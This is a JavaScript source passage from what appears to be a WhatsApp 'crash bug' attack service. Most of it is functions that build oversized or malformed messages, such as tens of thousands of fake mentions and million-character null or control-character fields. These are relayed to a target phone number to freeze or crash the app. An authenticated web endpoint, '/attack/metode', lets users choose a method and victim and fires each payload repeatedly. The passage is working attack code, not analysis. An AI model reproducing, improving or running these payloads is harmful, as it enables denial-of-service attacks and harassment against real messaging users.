          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 25000 }, () =>
                  `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED"
                        }
                    }, {});
                  }

async function AmeliaBeta(skid, target) {
  try {
    const mentionedList = [
      "13135550002@s.whatsapp.net",
      ...Array.from({ length: 2000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
      )
    ];

    const embeddedMusic = {
      musicContentMediaId: "589608164114571",
      songId: "870166291800508",
      author: "SaturnZx Send Bug" + "ោ៝".repeat(10000),
      title: "SaturnZx Modders",
      artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
      artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
      artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
      artistAttribution: "https://www.instagram.com/_u/J.oxyy",
      countryBlocklist: true,
      isExplicit: true,
      artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMsg = {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/545780153_1768068347247055_8008910110610321588_n.enc?ccb=11-4&oh=01_Q5Aa2gF45pi45HoFCrDj40WuGbf2qvyU6K3wubsygX5Y_AnGmw&oe=68E66184&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "EY0PNB4nOae0b9/f+tNPB99rJSmJZ/Ns2SEfu7Jc8wI=",
        fileLength: "2534607",
        seconds: 8,
        mediaKey: "YDQMBzXkapRZjXrPVAr2CwEPIBnv6aDHHQLaEYLOPyE=",
        height: 1280,
        width: 720,
        fileEncSha256: "XcTQbrJvO9ICWDBnW8710Ow4QLbygfTUYzP3l0rg0no=",
        directPath: "/v/t62.7161-24/545780153_1768068347247055_8008910110610321588_n.enc?ccb=11-4&oh=01_Q5Aa2gF45pi45HoFCrDj40WuGbf2qvyU6K3wubsygX5Y_AnGmw&oe=68E66184&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1757337021",
        jpegThumbnail: Buffer.from("...base64thumb...", "base64"),
        contextInfo: {
          isSampled: true,
          mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780343299@newsletter",
          serverMessageId: 1,
          newsletterName: "SaturnX Send Bug"
        },
        annotations: [
          {
            embeddedContent: { embeddedMusic },
            embeddedAction: true
          }
        ]
      }
    };

    const stickerMsg = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              mentionedJid: ["13135550002@s.whatsapp.net"],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593
            },
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: true,
            isAiSticker: true,
            isLottie: true
          }
        }
      }
    };

    const biji = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "SaturnX Send Delay",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x10".repeat(1045000),
                version: 3
              },
              entryPointConversionSource: "galaxy_message"
            }
          }
        }
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "999999")
      }
    );

    await skid.relayMessage("status@broadcast", biji.message, {
      messageId: biji.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });
    await sleep(1000); // sᴇᴛᴛɪɴɢ ᴀᴊᴀ 

    await skid.relayMessage("status@broadcast", videoMsg, {
      messageId: "SaturnZx-" + Date.now(),
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });
    await sleep(1000); // sᴇᴛᴛɪɴɢ ᴀᴊᴀ 

    await skid.relayMessage("status@broadcast", stickerMsg, {
      messageId: "Sticker-" + Date.now(),
      statusJidList: [target]
    });
    await sleep(1000); // sᴇᴛᴛɪɴɢ ᴀᴊᴀ 

    console.log(chalk.red(`Send Bug SaturnBeta : ${target}`));
  } catch (err) {
    console.error("SaturnBeta Error:", err);
  }
}

async function XNecroDelayX(skid, target, mention) {
  const X = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "𝐒𝐚𝐭𝐫𝐮𝐧𝐗𝐭𝐞𝐚𝐦",
    title: "XxX",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const message1 = {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: "SaturnzX" + "-Id" + Math.floor(Math.random() * 99999),
        forwardingScore: 100,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(10000)
        },
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
          )
        ],
        annotations: [
          {
            embeddedContent: {
              X
            },
            embeddedAction: true
          }
        ]
      }
    }
  };
  
  const message2 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "𝐒𝐚𝐭𝐫𝐮𝐧𝐗𝐭𝐞𝐚𝐦៚", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "{}"
        },
        contextInfo: {
          participant: target,
          mentionedJid: Array.from(
            { length: 1900 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
        ),
        quotedMessage: {
           paymentInviteMessage: {
             serviceType: 3,
             expiryTimestamp: Date.now() + 1814400000
             },
           },
         },
       },
     },
   };
   
  const message3 = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
           mentionedJid: [
             "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };
  
  const msg = generateWAMessageFromContent(target, message1, message2, message3, {});

  await skid.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await skid.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}

async function XNecroDozerX(target, mention) {
	if (typeof jid !== 'string') {
  jid = jid?.id || jid?.remoteJid || jid?.participant || String(jid);
}
  let etc1 = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "",
            locationMessage: {
              degreesLatitude: -999.03499999999999,
              degreesLongitude: 922.999999999999,
              name: "\u900A",
              address: "\u0007".repeat(00),
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: { 
            text: "𝙎𝙖𝙩𝙪𝙧𝙣𝙓𝙣𝙤𝘼𝙢𝙥𝙤𝙨" 
          },
          nativeFlowMessage: {
            messageParamsJson: "[]".repeat(4000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  title: "\u0003".repeat(1500),
                  sections: [
                    {
                      title: "",
                      rows: [],
                    },
                  ],
                }),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                name: "\u0003".repeat(200),
                }),
              },
            ],
          },
        },
      },
    },
  }), {});
  
  let etc2 = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "𒑡𝘼𝙢𝙥𝙪𝙣𝘽𝙤𝙨𝙠𝙪៚", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "{}"
        },
        contextInfo: {
          stanzaId: target,
          participant: target,
          mentionedJid: Array.from(
            { length: 1900 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
        ),
        quotedMessage: {
           paymentInviteMessage: {
             serviceType: 3,
             expiryTimestamp: Date.now() + 1814400000
             },
           },
         },
       },
     },
   }),
   { 
     ephemeralExpiration: 0,
     forwardingScore: 9741,
     isForwarded: true,
     font: Math.floor(Math.random() * 99999999),
     background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"), 
   }
  );
   
  let etc3 = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
           mentionedJid: [
             "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  }), {});
  
  await skid.relayMessage("status@broadcast", etc1.message, {
    messageId: etc1.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  await skid.relayMessage("status@broadcast", etc2.message, {
    messageId: etc2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  await skid.relayMessage("status@broadcast", etc3.message, {
    messageId: etc3.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await skid.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: etc1.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
  
  if (mention) {
    await skid.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: etc2.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
  
  if (mention) {
    await skid.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: etc3.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
  console.log(chalk.red(`Succes Sending Bug Bulldozer To:`, target));
  await sleep(250);
}
async function trashproto(skid, target) {
console.log(chalk.red(`Send Bug Delay`));
    const messageX = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "saturnXteam",
                    listType: 2,
                    buttonText: null,
                    sections: Array.from({ length: 9741 }, (_, r) => ({
                        title: "꧀".repeat(9741),
                        rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
                    })),
                    singleSelectReply: { selectedRowId: "🐉" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1900 }, () =>
                            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: idch,
                            serverMessageId: 1,
                            newsletterName: SaturnXTeam
                        }
                    },
                    description: "꧀"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, messageX, {});

    await skid.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await skid.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function LocXzVinz(skid, target) {
  try {
    const locationMessageContent = proto.Message.fromObject({
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "ッIb || SaturnXteam",
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "\u900A",
                address: "\u0007".repeat(20000),
                jpegThumbnail: global.thumb,
              },
              hasMediaAttachment: true,
            },
            body: { text: "" },
            nativeFlowMessage: {
              messageParamsJson: "[]".repeat(4000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "\u0003".repeat(1500),
                    sections: [
                      {
                        title: "ッIb || K1P0p",
                        rows: [],
                      },
                    ],
                  }),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    name: "\u0003".repeat(200),
                  }),
                },
              ],
            },
          },
        },
      },
    });

    locationMessageContent.mentionedJid = [
      "1@s.whatsapp.net",
      ...Array.from({ length: 15000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`),
    ];

    const msg = generateWAMessageFromContent(
      target,
      locationMessageContent,
      { userJid: target }
    );

    if (Math.random() > 0.5) {
      await skid.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  { tag: "to", attrs: { jid: target }, content: undefined },
                ],
              },
            ],
          },
        ],
      });
    } else {
      await skid.relayMessage(target, msg.message, { messageId: msg.key.id });
    }
  } catch (err) {}
}
async function bulldozer(skid, target) {
  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }
    }
  }

  const msg = generateWAMessageFromContent(target, message, {})

  await skid.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  })
}
async function LocaX(skid, target) {
  const generateLocationMessage = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 21.1266,
          degreesLongitude: -11.8199,
          name: "x",
          url: "https://t.me/Kyxsancs",
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 999999,
            isForwarded: true,
            quotedMessage: {
              extendedTextMessage: {
                text: "\u0000".repeat(100000)
              }
            },
            externalAdReply: {
              advertiserName: "whats !",
              title: "Free Fire ?",
              body: "{ x.json }",
              mediaType: 1,
              renderLargerThumbnail: true,
              jpegThumbnail: null,
              sourceUrl: "https://example.com"
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: "{}" + "\u0000".repeat(100000)
            }
          ],
          messageParamsJson: "{}"
        }
      }
    }
  }

  const msg = generateWAMessageFromContent("status@broadcast", generateLocationMessage, {})

  await skid.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  }, { participant: target })
}
app.get("/attack/metode", requireAuth, enforceCooldown, async (req, res) => {
  try {
    const metode = req.query.metode;
    const target = req.query.target;
    const ipClient = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const waktu = new Date().toLocaleString();
    
    if (!metode || !target) {
      return res.status(400).json({
        status: false,
        message: "'method' and 'target' parameters are required"
      });
    }

    // ====== CEK COOLDOWN PERSIST (acc.json) ======
    const accounts = loadAccounts();
    const meIndex = accounts.findIndex(a => a.username === req.user.username);
    const me = meIndex >= 0 ? accounts[meIndex] : null;

    const now = Date.now();
    const COOLDOWN_MS = 15 * 60 * 1000; // 40 menit
    const last = Number(me?.lastLaunch || 0);
    const remain = COOLDOWN_MS - (now - last);

    if (remain > 0) {
      const m = Math.floor(remain / 60000);
      const s = Math.floor((remain % 60000) / 1000);
      return res.status(429).json({
        status: false,
        message: `⏳ Tunggu ${m}m ${s}s sebelum bisa serang lagi`
      });
    }
    // ============================================

    const jid = toValidJid(target);
    if (!jid) {
      return res.status(400).json({
        status: false,
        message: "Nomor tidak valid"
      });
    }

    let decoded;
    try {
      decoded = jidDecode(jid);
    } catch (e) {
      return res.status(400).json({
        status: false,
        message: "JID decode gagal"
      });
    }

    if (typeof decoded !== 'object' || !decoded?.user || !isJidUser(jid)) {
      return res.status(400).json({
        status: false,
        message: "Invalid JID target (not a user JID or decode failed)"
      });
    }

    if (sessions.size === 0) {
      return res.status(400).json({
        status: false,
        message: "no active sender"
      });
    }

    const notifPesan = `
━────────────────────━
        𝐈𝐍𝐅𝐎 - 𝐀𝐂𝐓𝐈𝐕𝐈𝐓𝐘
━────────────────────━
New request bug
From User: ${req.user.username} (${req.user.role})
From IP: ${ipClient}
Time: ${waktu}
Method: ${metode}
Target: ${target}
━────────────────────━
Bot By: @RoufzzzNotDev
    `;
    await bot.telegram.sendMessage(owner, notifPesan);

    const botNumber = [...sessions.keys()][0]; // <- perbaikan: spread benar
    if (!botNumber) {
      return res.status(400).json({
        status: false,
        message: "no active sender"
      });
    }

    const nted = sessions.get(botNumber);
    if (!nted) {
      return res.status(400).json({
        status: false,
        message: "Socket not found for active bot number"
      });
    }

    const skid = nted;
    const mention = jid;
    
    // helper kirim 3x dengan jeda
    const send = async (fn, targetJid, ...args) => {
      for (let i = 0; i < 3; i++) {
        await fn(skid, targetJid, ...args);
        await sleep(1000);
      }
    };

    switch (metode.toLowerCase()) {
      case "uibug":
        console.log("🔥 Memulai 'ui'...");
        await send(XNecroKillNotif, jid);
        await sleep(3000);
        await send(XNecroBlankV4, jid);
        await sleep(3000);
        await send(BlankScreen, jid);
        await sleep(3000);
        await send(bulldozer, jid);
        await sleep(3000);
        await send(Aqua, jid);
        await sleep(3000);
        await send(AlbumBugger2, jid);
        await sleep(3000);
        await send(tasKill, jid);
        await sleep(3000);
        await send(interative, jid);
        await sleep(3000);
        await send(sletterZyrooX, jid);
        await sleep(3000);
        await send(UIKils, jid);
        await sleep(3000);
        await send(XNecroCrashUi, jid);
        break;

      case "ios":
        console.log("🔥 Memulai 'ios'...");
        await send(VampireBlankIphone, jid);
        await sleep(3000);
        await send(IosPayX, jid);
        await sleep(3000);
        await send(FcCrashIoSHyTaM, jid);
        await sleep(3000);
        await send(ProtoXAudio, jid, false);
        await sleep(3000);
        await send(LocXzVinz, jid);
        await sleep(3000);
        await send(nolosios, jid);
        await sleep(3000);
        await send(IosInvisibleForce, jid);
        await sleep(3000);
        await send(RansCrashIos, jid);
        await sleep(3000);
        await send(XNecroCrashIosV3, jid);
        await sleep(3000);
        await send(ShredderIosSql, jid);
        await sleep(3000);
        await send(iosinVisFC, jid, false);
        break;

      case "delay":
        console.log("🔥 Memulai 'delay'...");
        await send(trashproto, jid);
        await sleep(3000);
